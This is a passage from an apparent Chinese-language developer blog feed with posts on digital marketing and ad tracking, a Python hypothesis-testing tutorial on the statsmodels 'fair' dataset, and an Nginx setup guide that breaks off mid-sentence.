<span class="comment">//  getRange(row, column, numRows, numColumns)</span></span><br><span class="line">  sheet.<span class="title function_">getRange</span>(<span class="number">2</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">1</span>).<span class="title function_">setValues</span>(arrayKo);</span><br><span class="line">  sheet.<span class="title function_">getRange</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">31</span>, <span class="number">1</span>).<span class="title function_">setValues</span>(arrayThai);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這些操作對於需要進行短期社群觀察的個人來說是非常方便的，當然，若你有長期需求，使用付費版本將是更穩定的選擇。</p><h2 id="地方性社群與行銷"><a href="#地方性社群與行銷" class="headerlink" title="地方性社群與行銷"></a>地方性社群與行銷</h2><p>除了全球性的社群平台，地方性社群（如台灣的批踢踢或香港的連登）也發揮著重要作用。在特定的社會議題上，這些社群能夠迅速擴散訊息，並引發關注與行動。</p><p>例如，香港反送中的討論和籌款活動便透過地方性社群的力量在短時間內募集了大量資金。</p><p><img src="/2019/08/13/thinking-social-media-inside/lihkg.png" alt="lihkg"></p><p>此外也透過社群的推廣，在短短三小時時募集了 190 萬美金，這個故事告訴我們，真的要好好努力賺錢，不對，是不可以忽視網路的力量。</p><blockquote><p>在網路上沒有被遺忘的權力 (請輸入檢索詞 WWW)</p></blockquote><ul><li><a href="https://crowdwatch.tw/projects/2139">https://crowdwatch.tw/projects/2139</a></li><li><a href="https://www.gofundme.com/f/standwithhk-international">https://www.gofundme.com/f/standwithhk-international</a></li></ul><p><img src="/2019/08/13/thinking-social-media-inside/gofundme.png" alt="gofundme"></p><h3 id="數位外交行動計劃"><a href="#數位外交行動計劃" class="headerlink" title="數位外交行動計劃"></a>數位外交行動計劃</h3><p>前陣子去聽了數位外交行動計畫的分享，就是一個社群媒體在外交上應用成功的案例。</p><p>這個組織在找到可以切入的問題點後，就從社群開始進入並逐漸擴大影響力，是個厲害的組織。</p><ul><li><a href="https://www.facebook.com/TaiwanDigitalDiplomacy">https://www.facebook.com/TaiwanDigitalDiplomacy</a></li></ul><p>當然透過社群媒體的力量，也讓我們看見公民素養與影響力的展現，反之也看到運用社群軟體來分化社會的例子 QQ</p><ul><li><a href="https://www.facebook.com/watch/?v=438062300381738">https://www.facebook.com/watch/?v=438062300381738</a></li><li><a href="https://www.facebook.com/newsalaryman689/photos/a.1694563840813756/2339524546317679/">https://www.facebook.com/newsalaryman689/photos/a.1694563840813756/2339524546317679/</a></li></ul><h2 id="再行銷與數位廣告"><a href="#再行銷與數位廣告" class="headerlink" title="再行銷與數位廣告"></a>再行銷與數位廣告</h2><p>現今數位行銷的精髓之一就是再行銷（Retargeting），通過追蹤使用者的行為，進行個性化廣告投放。</p><p>例如，你曾經在某個購物網站上瀏覽過某個商品，之後你就會看到相關的廣告出現在 Facebook 或 YouTube 上，這是利用行為數據來提高廣告轉換率的策略。</p><blockquote><p>天啊，我被綁架了嗎?</p></blockquote><p>最近越來越有種在網路上很裸露的感覺，事情是這樣的，主要發生了兩件事:</p><ul><li>最近點了一下藍鯨的機票，結果臉書上就不小心看到了藍鯨機票的特價訊息 (來自 skyscanner(幹連地點都這麼準(靠腰也太裸露了吧。</li><li>過了一陣子，因為最近發現溝通成本過高，時間限制下不得已選擇放棄隊友，開始慢慢自己 carry 後端，於是多讀了一點 node.js 的東西，然後就在 Youtube 上看到了 The node js master 的課程推薦(幹連語言都這麼精準。</li><li>其他大概就是點過購物網站後，hotmail 的側欄會出現上次觀看的類別(像是最近剛逛了 ssd 所以就被推 3c，或是臉書裡面會看到 ssd 的特價訊息</li></ul><blockquote><p>才慢慢驚覺，天啊，原來這就是廣告，我們就這樣被貼標籤了。</p></blockquote><p>再來每個 Campaign 都會依照需要來決定這次的 Objective:</p><ul><li>Branding 也許需要的只是流量，下的條件可能相對簡單，像是 25~30 歲位於台南，計費也許是用 CPC (Cost per click) 來計費</li><li>Retargeting 已經付了比較貴的廣告費，也針對特定的目標對象進行再行銷，也就是打了一次，再打一次 xddd 精準的通常都會期待 TA 能有進一步的發展，比較可能就是用 CPA (Cost per action) 來計費<ul><li>Behavioral targeting 比較進階一點透過使用者過去瀏覽網路的行為及路徑，找出潛在消費需求 (像是中槍的機票推薦，進一步也可以把廣告素材綁到<a href="https://support.google.com/authorizedbuyers/answer/3221407?hl=zh-Hant">廣告識別碼上面</a></li></ul></li><li>當然 APP 的話還有 CPI (Cost per install)</li></ul><p>後來好奇點了一下廣告上面的小按鈕，才發現竟然不是 google 而是 criteo，目前 EC (電子消費) 的廣告投放幾乎都是他們的天下。</p><p>那怎麼將訊息打到目標對象，首先還是需要定義目標對象，然後研究他們</p><ul><li>何時上網?</li><li>喜歡什麼？</li><li>什麼人事物對目標對象有影響力？</li><li>使用什麼社群媒體？</li></ul><p>上面這些才是核心，然後在不同的媒介上投放的訊息就會有所不同，最重要的是統一風格的重要，統一可以表現出一個形象，只要形象打到了，就會知道是你。</p><p>像是品牌標誌的使用方式，字形或色彩，比較容易忽略的是語調，這樣才不會跳痛或是覺得是不是小編請假了，在很多社群媒體上，我們下意識都會先看到圖才看到帳號，所以讓別人記得你的形象，這才是品牌。</p><h3 id="Facebook-Pixel-追蹤與再行銷"><a href="#Facebook-Pixel-追蹤與再行銷" class="headerlink" title="Facebook Pixel 追蹤與再行銷"></a>Facebook Pixel 追蹤與再行銷</h3><p>那究竟是在什麼環節上被偷偷地貼標籤，答案就是當我們瀏覽網頁並進行動作的時候。</p><p>在好奇心驅使下，剛剛我也產生了一個 <a href="https://www.facebook.com/business/help/952192354843755">pixel</a>，並且在 <a href="https://tagmanager.google.com/">google tag manager</a> 中的觸發條件設定了所有網頁瀏覽，然後神奇的就可以在 Facebook 的監控頁上看到了。</p><p>也就是說我們設計了一個情境，並把情境跟 Facebook 結合，這樣在觸發的時候，Facebook 就可以得到相關的訊息，進而進行後續的廣告活動，也就是大家常聽到的 Campaign 。</p><blockquote><p>沒錯，出賣我們的其實是我們自己的動作，還有我們常被推薦的那個網頁。</p></blockquote><p>怎麼避免裸露?</p><p>使用無痕，這樣我們的 <a href="https://github.com/Valve/fingerprintjs">Fingerprint (註)</a> 會不一樣，比較變態的<a href="https://en.wikipedia.org/wiki/Zombie_cookie">殭屍 cookie</a> 好像不常見所以就忽略了? 另外也可以選擇使用上古神器，也就是地表最強 Chrome 的安裝器 IE xddd 聽說因為真的太爛了導致很多功能都不支援也就不會有後續問題了 xddd</p><p>註: Fingerprinting is a technique, outlined in the research by Electronic Frontier Foundation, of anonymously identifying a web browser with accuracy of up to 94%.</p><h2 id="未來趨勢：聊天機器人與-AI"><a href="#未來趨勢：聊天機器人與-AI" class="headerlink" title="未來趨勢：聊天機器人與 AI"></a>未來趨勢：聊天機器人與 AI</h2><p>故事回到 2008 年，Google 在 2008 年推出了 Andriod 的第一個版本，三年後的 2011 年大家普遍開始理解什麼是智慧型手機，那個薑餅人 andriod 2.3.3 Gingerbread，htc 也從那時候開始逐漸邁向巔峰。</p><p>當大部分人還在用功能型手機時，還記得大學同學買到潮潮 desire 就立馬獻寶??? 由此可見當時智慧型手機在大家心中的地位，以及大家對智慧型手機的期待~</p><img alt="htc" src="https://cdn.redmondpie.com/wp-content/uploads/2011/08/HTC-Desire-and-the-Problem-with-Gingerbread.jpg"> <p>我也在推甄上研究所的時候，用爸爸公司的購物金買了一隻 LG P350 算是一個低階的入門款，也用他開始我的 Andriod 開發之旅，從那時候開始很多方便的服務開始出現。</p><p>像是我們開始出現了通訊軟體，我們擁有了能夠定位的網路地圖，漸漸我們漸漸不再用 MSN 和 BBS，漸漸我們不再使用紙本地圖，網路也從 2G -&gt; 3g 到了現在 4G，幾乎每個人都擁有能夠上網的手機了，APP 數量增加的速度也遠超過大家的想像，大量的改變了我們的生活，譬如說：</p><blockquote><p>早上起來的第一件事情，關掉手機的鬧鐘，接著打開 facebook 看一下，然後是確認行事曆，啊<del>下雨了，今天跟朋友約好的地方離捷運站好遠，用個叫車 APP 吧？早餐不知道吃什麼才<br>好，用 google 地圖查查附近有什麼好吃的早餐吧？欸！好像是 IG 熱門打卡景點，就決定是你惹</del></p></blockquote><p>就這樣 APP 進入了一個爆炸進步的黃金年代…</p><p>故事來到 2018 年，如果說從 2010 年開始的 10 年是 app 的黃金年代，也許 2020 年開始的 10 年會是聊天機器人的黃金年代，今年是 2018 年，google io 在幾小時前 demo 了 <a href="https://ai.googleblog.com/2018/05/duplex-ai-system-for-natural-conversation.html">AI 機器人</a> 目前可以做到的事情，不看還好，一看了突然覺得，靠～真的假的…</p><blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Google Assistant will be able to make actual phone calls for you <a href="https://t.co/AkQjVynER1">pic.twitter.com/AkQjVynER1</a></p>&mdash; The Verge (@verge) <a href="https://twitter.com/verge/status/993946119607549952?ref_src=twsrc%5Etfw">May 8, 2018</a></blockquote><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>除了把世界棋王電到不要不要以外，我們可以竟然讓機器人幫我們撥電話去預定一些事情了??!!!! 這其中有一些爆點：</p><ul><li>可以理解我們心中期待</li><li>可以知道我們想要什麼</li><li>可以幫助我們完成目的</li></ul><p>那回到我們日常生活中，我們又可以做些什麼來跟上潮流呢？不會 AI 也沒關係，畢竟沒看過豬走路也吃過豬肉，常用的通訊軟體之中，好像就藏了一些小祕密，像是 Line 或是 Facebook 其實都提供了聊天機器人的服務，那又可以做到什麼呢？先看個趨勢，從 Chatbot Marketing 這個關鍵字去查可以看到<a href="https://www.scripted.com/content-marketing/chatbot-marketing">一篇文章</a>，重點如下：</p><ul><li>28.2 trillion mobile messages are expected to be sent in 2017. This number is about double the amount of messages sent in 2012.</li><li>The open rate for mobile messages is a near perfect 98 percent, which is exponentially higher than the 22 percent rate emails employ.</li><li>Six of the top apps used globally are messaging apps.</li><li>Retention rate of messaging apps is about double the amount of other types of apps.</li></ul><p>看不懂英文沒關係，翻譯年糕：</p><ul><li>推測去年大概傳輸了 28.2 兆則訊息，約是 2012 年的二倍</li><li>通訊軟體的已讀率 98% &gt;&gt;&gt; Email 的 22%</li><li>熱門 apps 中前 6 是通訊軟體</li><li>通訊 app 有 2 倍的可能會被留下來</li></ul><p>目前 facebook 和 line 兩家目前都有提供 API，當整合有限狀態機進去時，會有什麼樣的變化?</p><p>也許我們就能把分散功能整合在一起，像是透過 messenger 預定航班， 收到航班預定確認時，就馬上透過過去按讚的習慣來推薦旅館景點和交通方式等等資訊，以往這些功能都分散在不同的 app 中，現在彷彿出現了新的可能?</p><p>對於這種目標指向且有程序性的問題，首先範圍已經很限縮，並不像閒聊會有奇怪的斷句，所以只要做到特定限制下，讓使用者得到想要的資訊我覺得並不困難？也就是有限狀態機的概念，就只是在不同的狀態間移動，所以我們就可以做到在通訊軟體這個出奇蛋中，一次完成三個願望(誤)</p><h3 id="聊天機器人實作"><a href="#聊天機器人實作" class="headerlink" title="聊天機器人實作"></a>聊天機器人實作</h3><p>機器人後端的實作可能為</p><ul><li>串接 skyplaner 的 API 接著顯示相關結果</li><li>透過金流系統串接直接下定</li><li>信箱服務串接像是 gmail 在收到信時可以搭配 google map 自動推薦旅館及遊程和當地交通方式</li></ul><p>如果需要收集消費者相關資料並自行推播相關產品的話，可能需要寫一個 backend service 來串接整理相關資訊，大致上就是我們收到 facebook || line 傳來的 user, id 及訊息，接著透過訊息來撈取相關資訊進行回覆，同時也偷存下這個使用者的相關資訊以便未來分析，甚至也可以考慮直接使用 facebook 本身提供的 <a href="https://www.facebook.com/business/products/messenger-for-business">messenger 廣告服務</a>?</p><p>不會寫 code 也可以?也許大家以為實作出一個聊天機器人會需要很多背景知識，但已經有一些技術宅幫大家克服難關了像是 Chatfuel 或是 Manychat 這樣的服務，使用起來都是號稱十分鐘內就可以做出來了!!!</p><p>試了一下真的超簡單，歡迎各位大大跟<a href="https://www.facebook.com/linyencheng.3mins">我的粉專</a>聊聊天喔 xddd 心動了嗎? 快去試玩吧！xddd</p>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 數位行銷 </tag>
            
            <tag> 產業觀察 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Hypothesis Testing (假設檢定)</title>
      <link href="/2019/08/01/python-hypothesis-testing/"/>
      <url>/2019/08/01/python-hypothesis-testing/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會透過 Python 實作 Hypothesis Testing (假設檢定)，以 <a href="https://github.com/statsmodels/statsmodels">statsmodels</a> 中的範例資料集 <a href="https://github.com/statsmodels/statsmodels/blob/master/statsmodels/datasets/fair/fair.csv">fair</a> 來講解，這是一份關於外遇的統計資料， 資料筆數 6367 筆，檢定主要希望可以看到一些有趣的訊息，舉例來說像是職業會不會影響婚外情。</p><blockquote><p>首先感謝 <a href="https://www.meetup.com/Tainan-py-Python-Tainan-User-Group/">Tainan.py</a> 舉辦這次很棒的年會</p></blockquote><p>如果大家有興趣的話可以關注一下他們的 <a href="https://www.meetup.com/Tainan-py-Python-Tainan-User-Group/">Meetup 頁面</a>、<a href="https://www.facebook.com/groups/mosut/">南部社群的臉書社團</a>。</p><h2 id="環境安裝及設定"><a href="#環境安裝及設定" class="headerlink" title="環境安裝及設定"></a>環境安裝及設定</h2><p>首先當然是安裝 python 本人，如果需要在 cmd 中可以執行 <code>python hello.py</code>，需要先在環境變數中增加相關路徑。</p><p><a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></p><p>另外 python 預設是將相關函式庫安裝在 global 的環境中，在開發的時候可能會常常需要做實驗，所以我們會需要一個實驗的環境，那就是安裝虛擬環境管理工具 Anacoda，在 node.js 中就是一個避免每次都執行 <code>npm -g</code> 的概念。</p><p><a href="https://www.anaconda.com/distribution/">https://www.anaconda.com/distribution/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install scipy  <span class="comment"># 沒有虛擬環境</span></span><br><span class="line">conda install scipy <span class="comment"># 使用虛擬環境</span></span><br></pre></td></tr></table></figure><p>conda 的常用指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">conda list</span><br><span class="line">conda <span class="built_in">env</span> list</span><br><span class="line">conda create --name TESTENV python=3.6</span><br><span class="line">conda activate TESTENV</span><br><span class="line">conda deactivate</span><br><span class="line">conda install scipy</span><br><span class="line">conda list</span><br></pre></td></tr></table></figure><h2 id="資料集簡介"><a href="#資料集簡介" class="headerlink" title="資料集簡介"></a>資料集簡介</h2><p>這次很幸運的可以在社群聚會聽到 Mosky 大大的開示 (<a href="https://speakerdeck.com/mosky/hypothesis-testing-with-python">投影片在這裡</a>)，了解一些檢定在電商上可能的應用。不過由於商業機密的關係，這次講解的範例，主要以 <a href="https://github.com/statsmodels/statsmodels">statsmodels</a> 中的範例資料集 <a href="https://github.com/statsmodels/statsmodels/blob/master/statsmodels/datasets/fair/fair.csv">fair</a> 來講解，這是一份關於外遇的統計資料， 資料筆數 6367 筆，檢定主要希望可以看到一些有趣的訊息，舉例來說像是職業會不會影響婚外情。</p><h2 id="假設檢定簡介"><a href="#假設檢定簡介" class="headerlink" title="假設檢定簡介"></a>假設檢定簡介</h2><p>首先從我們的資料看起，在統計上分析可以分成兩種案例：</p><ul><li>有母數：分佈相同可以代表樣本，那就可以從平均數來看一些假設</li><li>無母數：如果不確定分佈是否相同- 基本上就是中位數，像是台灣的薪水分佈</li></ul><p>在做假設檢定的時候會有兩種假設</p><ul><li>null hypothesis: 是我們要推翻的假設，期望值相減等於零，可以直接建立模型</li><li>alternative hypothesis: 我們想證明但可能不好觀察，透過否證法證明(推翻 null hypothesis)</li></ul><p>其中我們會用到 p-value，簡單來說 p-value 就是觀察抽樣出來的機率密度，如果越低代表不可能，主要使用這個來判斷假設是否正確，當然可以接受的範圍要看資料內容，不能跟新聞一樣斷章取義 QQ</p><p>應用上舉例來說，在某個情境下，我們會定義一個模型，然後期待把資料丟進去算出機率。透過這樣的機率來判斷是否要相信我們的假設，通常這個要依據我們的商品而定，像是筆電負評率 1% 燈泡可能可以到 10%。</p><h2 id="檢定可解決的問題"><a href="#檢定可解決的問題" class="headerlink" title="檢定可解決的問題"></a>檢定可解決的問題</h2><p>適合回答是否有改變的問題，像是男生和女生平均購物金額是否有差異，或是購買皮卡丘玩偶在不同年齡的男女比例是否有差異。另外一個問題是 sample size 要怎麼決定？假設今天只是猜男女這種五五波問題，sample size 假設需要一千，但如果需要猜測平均轉換率 2%，可能相對要十萬。</p><ul><li>平均值問題：welche t-test</li><li>比例問題：卡方檢定</li><li>找出兩組不同的機率: power analysis</li></ul><h2 id="好用工具"><a href="#好用工具" class="headerlink" title="好用工具"></a>好用工具</h2><p>在 python 中有相當多的好用工具：</p><ul><li>scipy 中提供相當多的數學計算公式，這次使用較多的為 stats</li><li>pandas 可以從異質資料來源讀取檔案內容，並將資料放入 DataFrame 中，data frame 相當於 execl 中一個 sheet，DataFrame [] 相當於 filter 或是 sql 中的 select</li><li>seaborn 講者大力推薦 python 中畫圖的一個函式庫，將統計數據視覺化，像是 pointplot、countplot</li><li>matplotlib.pyplot 畫完圖如果要顯示可以用這個工具</li></ul><h2 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h2><p>按照教學上的說明，我們要先安裝相關函式庫，有以下兩種方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install jupyter numpy scipy sympy matplotlib ipython pandas seaborn statsmodels scikit-learn</span><br><span class="line">conda install jupyter numpy scipy sympy matplotlib ipython pandas seaborn statsmodels scikit-learn</span><br></pre></td></tr></table></figure><p>直接進入範例，範例中將看婚姻滿意度對外遇的影響，這裡定義數字小於 2 我們當作不滿意。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> scipy <span class="keyword">as</span> sp</span><br><span class="line"><span class="keyword">import</span> statsmodels.api <span class="keyword">as</span> sm</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> IPython.display <span class="keyword">import</span> display</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sm.datasets.fair.SOURCE,</span><br><span class="line">      sm.datasets.fair.NOTE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -&gt; Pandas&#x27;s Dataframe</span></span><br><span class="line">df_fair = sm.datasets.fair.load_pandas().data</span><br><span class="line">df = df_fair</span><br><span class="line"><span class="comment"># 2: poor</span></span><br><span class="line"><span class="comment"># 3: fair</span></span><br><span class="line">df = df.assign(poor_marriage_yn=(df.rate_marriage &lt;= <span class="number">2</span>))</span><br><span class="line">df_fair_11 = df</span><br><span class="line"></span><br><span class="line">df = df_fair_11</span><br><span class="line">display(df</span><br><span class="line">        .groupby(<span class="string">&#x27;poor_marriage_yn&#x27;</span>)</span><br><span class="line">        .affairs</span><br><span class="line">        .describe())</span><br><span class="line">a = df[df.poor_marriage_yn].affairs</span><br><span class="line">b = df[~df.poor_marriage_yn].affairs</span><br><span class="line"><span class="comment"># ttest_ind(...) === Student&#x27;s t-test</span></span><br><span class="line"><span class="comment"># ttest_ind(..., equal_var=False) === Welch&#x27;s t-test</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p-value:&#x27;</span>,</span><br><span class="line">      sp.stats.ttest_ind(a, b, equal_var=<span class="literal">False</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">df = df_fair_11</span><br><span class="line">sns.pointplot(x=df.poor_marriage_yn,</span><br><span class="line">              y=df.affairs)</span><br><span class="line"><span class="comment"># show result</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>結果，最後真的可以看出有明顯差異，所以是否該開始照顧另一半的滿意度了！</p><p><img src="/2019/08/01/python-hypothesis-testing/hypothesis-testing.png" alt="hypothesis-testing"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網站技術 </tag>
            
            <tag> Backend </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx Config 與常用指令教學</title>
      <link href="/2019/07/13/tool-nginx/"/>
      <url>/2019/07/13/tool-nginx/</url>
      
        <content type="html"><![CDATA[<p>Nginx 是非同步框架的網頁伺服器，主要用於</p><ul><li>反向代理 (reverse proxy) 能作為 API Gateway 進行後端分流</li><li>負載平衡 (load balancer) 和快取 (HTTP Cache) 可用於靜態網站架設</li></ul><p>讓我們來開箱教學 Nginx 常用指令和 Nginx Config (Reverse Proxy、https) 與效能優化，另一篇文章會接著介紹 <a href="/2022/12/25/tool-nginx-management/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Nginx 管理與監控工具 Nginx Proxy Manager、Nginx GIXY、GoAccess</a>。</p><h2 id="Nginx-常用指令"><a href="#Nginx-常用指令" class="headerlink" title="Nginx 常用指令"></a>Nginx 常用指令</h2><p>Linux 是檔案系統，所以檔案要有系統的被放置</p><ol><li>在 home 目錄底下的{使用者名稱}目錄: 因 linux 權限規劃嚴謹，檔案都有存取權限，建議發佈位置放在這個目錄下</li><li>etc (配置檔)</li><li>var(log)</li></ol><h3 id="安裝-Nginx"><a href="#安裝-Nginx" class="headerlink" title="安裝 Nginx"></a>安裝 Nginx</h3><ol><li>linux 環境安裝 Nginx</li></ol><ul><li>putty + ssh 連接至主機</li><li>升級系統相關套件與服務</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install nginx</span><br></pre></td></tr></table></figure><ol start="2"><li>windows 環境，在 Windows 只需要下載後解壓縮，即可執行 <code>start nginx</code> 使用。</li></ol><h3 id="Nginx-管理"><a href="#Nginx-管理" class="headerlink" title="Nginx 管理"></a>Nginx 管理</h3><p>在 Linux 主機上運用 Systemctl 做 Nginx 服務管理，在 Linux 中會使用 <code>sudo systemctl</code> 加上底下幾種指令:</p><ol><li>status (狀態)</li><li>stop (停止)</li><li>start (開始)</li><li>enable (開機啟用)</li><li>restart (重開)</li></ol><p>底下的範例就是看 nginx 目前的狀態，接著列出有在開機預設開啟中的程式或服務，最後看目前有在執行的服務。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx</span><br><span class="line">systemctl list-unit-files | grep enabled</span><br><span class="line">systemctl | grep running</span><br></pre></td></tr></table></figure><p>Windows 曾遇過起來多個 processes 關不掉，所以建議修改配置後使用 <code>nginx -s reload</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx -s stop    // fast shutdown</span><br><span class="line">nginx -s quit    // graceful shutdown</span><br><span class="line">nginx -s reload  // starting new worker processes with a new configuration, graceful shutdown of old worker processes</span><br><span class="line">nginx -s reopen  // re-opening <span class="built_in">log</span> files</span><br></pre></td></tr></table></figure><h3 id="Nginx-Log"><a href="#Nginx-Log" class="headerlink" title="Nginx Log"></a>Nginx Log</h3><p>Linux 的 log 會在 <code>/var/log</code>:</p><ul><li>access log: 位置會在 <code>/var/log/nginx/access.log</code></li><li>error log: 位置會在 <code>/var/log/nginx/error.log</code></li></ul><p>查看 nginx 的 access log，<code>tail -f /var/log/nginx/access.log</code>，這邊推薦可以使用 <a href="https://goaccess.io/">GoAccess</a> 將資訊圖像化，並搭配 Linux 的 <a href="https://github.com/allinurl/goaccess/issues/703">crontab 排程</a>進行自動更新。</p><p>如果沒有管理 log 可能會佔蠻多硬碟空間 (查看硬碟使用情況: <code>sudo du -sh /var/log/</code>)，改善方法有以下幾種：</p><ol><li>設定 Logrotate: <code>/etc/logrotate.d</code></li><li>指令清除 <code>sudo find /var/log/ -type f -regex &#39;.*\.[0-9]+\.gz$&#39; -delete</code></li><li>關掉 Access Logging: 只要紀錄就會對 CPU 硬碟產生消耗</li><li>增加 <a href="https://nginx.org/en/docs/http/ngx_http_log_module.html?&_ga=2.255673355.2046281064.1594341677-1932426211.1594341677#access_log">buffer size</a> 不要頻繁的製造 CPU 處理硬碟 IO，設定 flush&#x3D;time 的時間定期處理</li></ol><h2 id="Nginx-config-基礎設定"><a href="#Nginx-config-基礎設定" class="headerlink" title="Nginx config 基礎設定"></a>Nginx config 基礎設定</h2><p>網站架設首先會需要放置檔案到 Nginx 伺服器</p><ol><li>FTP，架設的方式很多部落客都有教學</li><li>jenkins，從版控抓 master branch 下來自動 build 及執行 shell 記得 <code>BUILD_ID=DONTKILLME</code></li></ol><p>設定接受請求的程式 (後端 API 或相關資源)</p><ol><li>靜態的檔案，前端常見 SPA (single-page application) 專案，需上傳靜態網頁到 Server，並設定正確的路由才能夠回應給使用者</li><li>如果是 node.js 的後端，需要使用 PM2 這類的工具進行管理，也推薦使用 cluster mode 無痛升級效能</li></ol><p>設定網站主要設定 server_name 指定網域，接著在 DNS 指向主機就大功告成。</p><ul><li>靜態網站: 指向正確就可以了</li><li>動態網頁: 如 php 需要搭配 fastcgi 做相關反向代理的設定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen         80 default_server;</span><br><span class="line">    server_name    example.com www.example.com;</span><br><span class="line">    root           /var/www/example.com;</span><br><span class="line">    index          index.html;</span><br><span class="line">    try_files <span class="variable">$uri</span> /index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen         80 default_server;</span><br><span class="line">    server_name    example2.com www.example2.com;</span><br><span class="line">    root           /var/www/example2.com;</span><br><span class="line">    index          index.html;</span><br><span class="line">    try_files <span class="variable">$uri</span> /index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="常見的-Nginx-Config"><a href="#常見的-Nginx-Config" class="headerlink" title="常見的 Nginx Config"></a>常見的 Nginx Config</h2><p>主要介紹下面幾項</p><ul><li>Nginx proxy_pass</li><li>Nginx Reverse Proxy</li><li>Nginx https</li></ul><h3 id="Nginx-proxy-pass-設定"><a href="#Nginx-proxy-pass-設定" class="headerlink" title="Nginx proxy_pass 設定"></a>Nginx proxy_pass 設定</h3><p>Nginx proxy_pass 的目的就是導流，透過不同的設定方式導流到不同的網站目錄，這就是反向代理的一個概念。</p><ul><li>導流到根目錄: <code>test.com/app/xxxxx =&gt; http://192.168.1.100/xxxxx</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /app/ &#123;</span><br><span class="line">    proxy_pass      http://192.168.1.100/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>導流到特定目錄: <code>test.com/app/xxxxx =&gt; http://192.168.1.100/maped_dir/xxxxx</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /app/ &#123;</span><br><span class="line">    proxy_pass       http://192.168.1.100/maped_dir/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="反向代理-Nginx-Reverse-Proxy"><a href="#反向代理-Nginx-Reverse-Proxy" class="headerlink" title="反向代理 (Nginx Reverse Proxy)"></a>反向代理 (Nginx Reverse Proxy)</h3><p>網域往往只能連到一台入口主機，但當我們後端有很多網站及服務分配到多台主機時，這時候就需要透過路徑上的代理來轉發還有配置附載平衡，Nginx 就提供了這樣的功能，當然 AWS 上也有提供相關服務。</p><p>除此之外還可以做負載平衡，反向代理該設的參數要設對，<a href="https://www.facebook.com/pcman.im/posts/1835852189787783">proxy_http_version 1.1 請注意</a>，有人有踩過雷了，另外附載平衡也很簡單，其中有幾種模式可以提供選擇，也可以進一步設定 health_check，讓 Nginx 